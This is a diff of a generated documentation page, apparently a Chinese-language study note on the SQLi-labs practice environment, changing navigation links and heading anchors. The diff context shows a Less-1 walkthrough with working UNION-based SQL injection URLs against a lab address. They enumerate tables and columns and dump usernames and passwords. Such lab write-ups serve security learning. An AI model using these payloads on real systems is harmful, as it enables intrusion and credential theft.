@@ -242,7 +242,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../Mysql安装.md" class="md-tabs__link">
+        <a href="../Mysql%E5%AE%89%E8%A3%85/" class="md-tabs__link">
           
   
   
@@ -455,7 +455,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Mysql安装.md" class="md-nav__link">
+      <a href="../Mysql%E5%AE%89%E8%A3%85/" class="md-nav__link">
         
   
   
@@ -478,7 +478,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../SQL-Hackbar 安装.md" class="md-nav__link">
+      <a href="../SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-nav__link">
         
   
   
@@ -507,6 +507,29 @@
   
   <span class="md-ellipsis">
     SQLi-labs 环境搭建
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE-%E8%85%BE%E8%AE%AF%E4%BA%91COS%2BPicGo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    图床配置
     
   </span>
   
@@ -1356,7 +1379,7 @@
 <li><strong>提取敏感数据</strong>：最终，通过<code>GROUP_CONCAT</code>等函数获取敏感数据，如用户名、ID、密码等。</li>
 </ol>
 <p>详细过程如下：</p>
-<h2 id="sql">一、测试是否存在SQL注入漏洞。</h2>
+<h2 id="sql">一、测试是否存在SQL注入漏洞。<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>http://10.16.2.3:8081/Less-1/?id=1&#39; order by 3 --+
 </code></pre></div>
 <ul>
@@ -1366,7 +1389,7 @@
 </ul>
 <p><strong>攻击目标：</strong> 测试系统是否容易受SQL注入影响，并尝试找出数据库查询中包含的列数。</p>
 <hr />
-<h3 id="union">二、通过<code>UNION</code>查询来获取数据库的更多信息</h3>
+<h3 id="union">二、通过<code>UNION</code>查询来获取数据库的更多信息<a class="headerlink" href="#union" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>http://10.16.2.3:8081/Less-1/?id=-1&#39; union select 1,2,3 --+
 </code></pre></div>
 <ul>
@@ -1376,7 +1399,7 @@
 </ul>
 <p><strong>攻击目标：</strong> 确认SQL查询中能返回的列数，并为进一步的注入操作做好准备。</p>
 <hr />
-<h3 id="_1">三、获取数据库的基本信息</h3>
+<h3 id="_1">三、获取数据库的基本信息<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>http://10.16.2.3:8081/Less-1/?id=-1&#39; union select 1,database(),version() --+
 </code></pre></div>
 <p>查询获取两个数据库信息：</p>
@@ -1387,7 +1410,7 @@
 </ul>
 <p>通过这种方式，攻击者可以获取有关数据库的名称和版本等敏感信息。</p>
 <hr />
-<h3 id="_2">四、获取数据库中表的名称</h3>
+<h3 id="_2">四、获取数据库中表的名称<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>http://10.16.2.3:8081/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+
 </code></pre></div>
 <ul>
@@ -1396,7 +1419,7 @@
 </ul>
 <p><strong>攻击目标：</strong> 获取目标数据库中所有表的名称。</p>
 <hr />
-<h3 id="users">五、获取某个表（例如<code>users</code>表）中的列名称</h3>
+<h3 id="users">五、获取某个表（例如<code>users</code>表）中的列名称<a class="headerlink" href="#users" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>http://10.16.2.3:8081/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+
 </code></pre></div>
 <ul>
@@ -1405,7 +1428,7 @@
 </ul>
 <p><strong>攻击目标：</strong> 获取<code>users</code>表中所有列的名称。</p>
 <hr />
-<h3 id="id">六、 获取用户表中的敏感数据（如用户名、ID和密码）</h3>
+<h3 id="id">六、 获取用户表中的敏感数据（如用户名、ID和密码）<a class="headerlink" href="#id" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>http://10.16.2.3:8081/Less-1/?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users --+
 </code></pre></div>
 <ul>
@@ -1413,7 +1436,7 @@
 </ul>
 <p><strong>攻击目标：</strong> 获取<code>users</code>表中的所有用户信息（用户名、ID和密码）。这些数据对于进一步的攻击（如登陆攻击）非常有价值。</p>
 <hr />
-<h3 id="_3">七、改进之前的注入，获取数据格式化后输出</h3>
+<h3 id="_3">七、改进之前的注入，获取数据格式化后输出<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>http://10.16.2.3:8081/Less-1/?id=-1&#39; union select 1,2,group_concat(username ,&#39;-&#39;,id,&#39;-&#39; , password) from users --+
 </code></pre></div>
 <ul>
